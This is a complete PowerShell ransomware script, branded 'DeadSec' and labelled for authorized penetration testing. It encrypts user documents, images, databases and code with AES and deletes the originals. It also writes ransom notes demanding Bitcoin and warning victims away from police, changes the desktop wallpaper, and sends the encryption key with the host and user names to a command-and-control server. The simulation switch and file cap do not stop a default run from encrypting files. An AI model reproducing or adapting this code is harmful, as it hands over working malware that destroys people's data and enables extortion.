# DeadSec Ransomware Module - PowerShell Version
# Advanced file encryption with wallpaper modification
# FOR AUTHORIZED PENETRATION TESTING ONLY

param(
    [string]$C2Server = "http://localhost:5000",
    [switch]$Simulate = $false
)

# Generate unique victim ID
function Generate-VictimID {
    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    $machineID = "$computerName-$userName"
    
    $md5 = New-Object System.Security.Cryptography.MD5CryptoServiceProvider
    $hashBytes = $md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($machineID))
    $hashString = [System.BitConverter]::ToString($hashBytes).Replace("-", "").Substring(0, 8)
    
    $randomPart = -join ((65..90) + (48..57) | Get-Random -Count 12 | ForEach-Object {[char]$_})
    $victimID = "DS-$hashString-$randomPart"
    
    return $victimID
}

# Generate encryption key
function Generate-EncryptionKey {
    param([string]$VictimID)
    
    $password = [System.Text.Encoding]::UTF8.GetBytes($VictimID)
    $salt = [System.Text.Encoding]::UTF8.GetBytes("DEADSEC_SALT_2025")
    
    $rfc2898 = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, 100000)
    $key = $rfc2898.GetBytes(32)
    
    return $key
}

# Encrypt file
function Encrypt-File {
    param(
        [string]$FilePath,
        [byte[]]$Key
    )
    
    try {
        # Skip if already encrypted
        if ($FilePath -like "*.deadsec") {
            return $false
        }
        
        # Read file content
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        
        # Create AES encryptor
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $Key
        $aes.GenerateIV()
        $iv = $aes.IV
        
        # Encrypt data
        $encryptor = $aes.CreateEncryptor()
        $encryptedBytes = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)
        
        # Combine IV and encrypted data
        $outputBytes = $iv + $encryptedBytes
        
        # Write encrypted file
        $encryptedPath = "$FilePath.deadsec"
        [System.IO.File]::WriteAllBytes($encryptedPath, $outputBytes)
        
        # Delete original file
        Remove-Item -Path $FilePath -Force
        
        return $true
    }
    catch {
        Write-Host "[!] Error encrypting $FilePath : $_" -ForegroundColor Red
        return $false
    }
}

# Encrypt directory
function Encrypt-Directory {
    param(
        [string]$Directory,
        [byte[]]$Key,
        [string[]]$TargetExtensions
    )
    
    $encryptedCount = 0
    $maxFiles = 100
    
    try {
        $files = Get-ChildItem -Path $Directory -Recurse -File -ErrorAction SilentlyContinue |
                 Where-Object { 
                     $_.Extension -in $TargetExtensions -and 
                     $_.FullName -notmatch "Windows|Program Files|ProgramData|AppData|System32"
                 }
        
        foreach ($file in $files) {
            if ($encryptedCount -ge $maxFiles) {
                break
            }
            
            if (Encrypt-File -FilePath $file.FullName -Key $Key) {
                $encryptedCount++
                Write-Host "[+] Encrypted: $($file.FullName)" -ForegroundColor Green
            }
        }
    }
    catch {
        Write-Host "[!] Error encrypting directory $Directory : $_" -ForegroundColor Red
    }
    
    return $encryptedCount
}

# Change desktop wallpaper
function Change-Wallpaper {
    param([string]$WallpaperPath)
    
    try {
        # Copy wallpaper to temp
        $tempWallpaper = Join-Path $env:TEMP "deadsec_wallpaper.png"
        Copy-Item -Path $WallpaperPath -Destination $tempWallpaper -Force
        
        # Set wallpaper using Windows API
        $SPI_SETDESKWALLPAPER = 0x0014
        $SPIF_UPDATEINIFILE = 0x01
        $SPIF_SENDCHANGE = 0x02
        
        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
        
        [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $tempWallpaper, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
        
        Write-Host "[+] Wallpaper changed to DeadSec ransom notice" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "[!] Error changing wallpaper: $_" -ForegroundColor Red
        return $false
    }
}

# Create ransom note
function Create-RansomNote {
    param(
        [string]$Directory,
        [string]$VictimID
    )
    
    $ransomNote = @"
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║           YOU'VE BEEN COMPROMISED BY DEADSEC                   ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝

YOUR FILES HAVE BEEN ENCRYPTED

All your important files have been encrypted with military-grade
AES-256 encryption. The only way to recover your files is to
obtain the decryption key from us.

VICTIM ID: $VictimID

⚠️ IMPORTANT WARNINGS:
- Do NOT attempt to decrypt files yourself (they will be corrupted)
- Do NOT rename encrypted files
- Do NOT delete this ransom note
- Do NOT contact law enforcement (we will know)

💰 PAYMENT INSTRUCTIONS:
1. Send 0.5 BTC to: 1DeadSecXXXXXXXXXXXXXXXXXXXXX
2. Email your VICTIM ID to: recovery@deadsec.onion
3. Wait for decryption key (usually within 24 hours)

⏰ TIME LIMIT: 72 hours
After this time, the decryption key will be permanently deleted.

═══════════════════════════════════════════════════════════════

IN THE SHADOWS, WE ARE LEGION.
IN THE LIGHT, WE ARE INVISIBLE.
WE ARE DEADSEC

For support: http://deadsec.onion/support
"@
    
    try {
        $notePath = Join-Path $Directory "!!!READ_ME_DEADSEC!!!.txt"
        $ransomNote | Out-File -FilePath $notePath -Encoding UTF8 -Force
        Write-Host "[+] Ransom note created: $notePath" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "[!] Error creating ransom note: $_" -ForegroundColor Red
        return $false
    }
}

# Exfiltrate data to C2
function Exfiltrate-Data {
    param(
        [string]$C2Server,
        [string]$VictimID,
        [byte[]]$EncryptionKey,
        [int]$FilesEncrypted
    )
    
    try {
        $data = @{
            victim_id = $VictimID
            encryption_key = [Convert]::ToBase64String($EncryptionKey)
            encrypted_files = $FilesEncrypted
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss")
        } | ConvertTo-Json
        
        $response = Invoke-RestMethod -Uri "$C2Server/ransomware_data" -Method Post -Body $data -ContentType "application/json" -TimeoutSec 10
        
        Write-Host "[+] Encryption data sent to C2 server" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "[!] Error exfiltrating data: $_" -ForegroundColor Red
        return $false
    }
}

# Main execution
function Execute-Ransomware {
    param(
        [string]$C2Server,
        [bool]$Simulate
    )
    
    Write-Host "`n" -NoNewline
    Write-Host ("="*60) -ForegroundColor Red
    Write-Host "  DEADSEC RANSOMWARE // ENCRYPTION MODULE" -ForegroundColor Red
    Write-Host ("="*60) -ForegroundColor Red
    Write-Host ""
    
    # Generate victim ID
    $victimID = Generate-VictimID
    Write-Host "[*] Victim ID: $victimID" -ForegroundColor Cyan
    
    # Generate encryption key
    Write-Host "[*] Generating encryption key..." -ForegroundColor Cyan
    $encryptionKey = Generate-EncryptionKey -VictimID $victimID
    Write-Host "[+] Encryption key generated" -ForegroundColor Green
    
    # Target extensions
    $targetExtensions = @(
        '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.mp4', '.mp3', '.wav',
        '.zip', '.rar', '.7z', '.sql', '.db', '.mdb', '.csv', '.xml',
        '.html', '.css', '.js', '.php', '.py', '.java', '.cpp', '.c'
    )
    
    # Target directories
    $targetDirs = @(
        [Environment]::GetFolderPath('MyDocuments'),
        [Environment]::GetFolderPath('Desktop'),
        [Environment]::GetFolderPath('MyPictures'),
        (Join-Path $env:USERPROFILE 'Downloads')
    )
    
    if ($Simulate) {
        Write-Host "`n[!] SIMULATION MODE - No files will be encrypted" -ForegroundColor Yellow
        Write-Host "[*] Would encrypt files in: $($targetDirs -join ', ')" -ForegroundColor Yellow
        Write-Host "[*] Would change wallpaper" -ForegroundColor Yellow
        Write-Host "[*] Would create ransom notes" -ForegroundColor Yellow
        return
    }
    
    $totalEncrypted = 0
    
    # Encrypt files
    Write-Host "`n[*] Starting encryption process..." -ForegroundColor Cyan
    foreach ($dir in $targetDirs) {
        if (Test-Path $dir) {
            Write-Host "`n[*] Encrypting: $dir" -ForegroundColor Cyan
            $count = Encrypt-Directory -Directory $dir -Key $encryptionKey -TargetExtensions $targetExtensions
            $totalEncrypted += $count
            
            # Create ransom note
            Create-RansomNote -Directory $dir -VictimID $victimID
        }
    }
    
    Write-Host "`n[+] Encryption complete!" -ForegroundColor Green
    Write-Host "[+] Total files encrypted: $totalEncrypted" -ForegroundColor Green
    
    # Change wallpaper
    Write-Host "`n[*] Modifying system appearance..." -ForegroundColor Cyan
    $scriptPath = Split-Path -Parent $MyInvocation.MyCommand.Path
    $wallpaperPath = Join-Path (Split-Path -Parent $scriptPath) "DeadSecBranding Kit\Compromised_Wallpaper2.png"
    
    if (Test-Path $wallpaperPath) {
        Change-Wallpaper -WallpaperPath $wallpaperPath
    }
    else {
        Write-Host "[!] Wallpaper not found at: $wallpaperPath" -ForegroundColor Yellow
    }
    
    # Create ransom note on desktop
    $desktop = [Environment]::GetFolderPath('Desktop')
    Create-RansomNote -Directory $desktop -VictimID $victimID
    
    # Exfiltrate data
    Write-Host "`n[*] Securing encryption keys..." -ForegroundColor Cyan
    Exfiltrate-Data -C2Server $C2Server -VictimID $victimID -EncryptionKey $encryptionKey -FilesEncrypted $totalEncrypted
    
    Write-Host "`n" -NoNewline
    Write-Host ("="*60) -ForegroundColor Red
    Write-Host "  ENCRYPTION COMPLETE // SYSTEM COMPROMISED" -ForegroundColor Red
    Write-Host ("="*60) -ForegroundColor Red
    Write-Host ""
    
    return @{
        VictimID = $victimID
        FilesEncrypted = $totalEncrypted
        EncryptionKey = [Convert]::ToBase64String($encryptionKey)
    }
}

# Run
Execute-Ransomware -C2Server $C2Server -Simulate $Simulate
